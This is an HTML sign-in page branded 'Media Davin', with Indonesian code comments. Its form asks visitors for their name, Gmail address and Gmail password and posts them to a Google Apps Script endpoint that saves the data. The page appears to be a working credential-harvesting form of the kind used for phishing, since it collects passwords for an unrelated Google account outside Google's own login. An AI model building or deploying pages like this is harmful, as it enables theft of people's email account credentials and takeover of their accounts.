<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Media.Davin</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
      background-image: url('background-image.jpg'); /* Ganti dengan URL gambar latar belakang Anda */
      background-size: cover;
      background-position: center;
      color: #0e65d6;
    }

    header {
      text-align: center;
      padding: 20px;
    }

    #form-container {
      width: 80%; /* Menggunakan persentase untuk lebar agar responsif */
      max-width: 400px; /* Tetapkan lebar maksimum */
      margin: 50px auto;
      background-color: rgba(255, 255, 255, 0.8);
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
    }

    #form-container h2 {
      text-align: center;
      color: #1E90FF;
      margin-bottom: 20px;
    }

    #form-container label {
      display: block;
      margin-bottom: 10px;
      color: #1E90FF;
    }

    #form-container input[type="text"],
    #form-container input[type="password"] { /* Menggunakan type="password" untuk input sandi */
      width: calc(100% - 22px);
      padding: 10px;
      margin-bottom: 20px;
      border: 2px solid #1E90FF;
      border-radius: 5px;
      font-size: 16px;
    }

    #form-container input[type="submit"] {
      background-color: #1E90FF;
      color: #FFFFFF;
      border: none;
      border-radius: 5px;
      padding: 10px 20px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s ease;
    }

    #form-container input[type="submit"]:hover {
      background-color: #004B8D;
    }

    #footer {
      text-align: center;
      margin-top: 30px;
      font-size: 12px;
      color: #000000;
    }

    /* Media query untuk layar yang lebih kecil dari 600px */
    @media (max-width: 600px) {
      #form-container {
        width: 90%; /* Ubah lebar agar sesuai dengan layar yang lebih kecil */
      }
    }
  </style>
</head>

<body>
  <header>
    <h1>SIGN IN MEDIA DAVIN</h1>
  </header>

  <div id="form-container">
    <form action="https://script.google.com/macros/s/AKfycbyNASStcarVHah7IMch99Sm4YZUl_fa11IsKLrLcEg2gREtApyfhnOnNX_tyG3_PIFbeQ/exec" method="post">
      <label for="nama">Nama:</label>
      <input type="text" id="nama" name="nama" required>
      <label for="alamat">Gmail:</label>
      <input type="text" id="alamat" name="alamat" required>
      <label for="sandi">Password:</label> <!-- Perbaiki typo "Passwoard" menjadi "Password" -->
      <input type="password" id="sandi" name="sandi" required> <!-- Gunakan type="password" untuk input sandi -->
      <input type="submit" value="Simpan Data">
    </form>
  </div>

  <footer id="footer">
    Media.Davin &copy; 2024 - All Rights Reserved
  </footer>
</body>

</html>
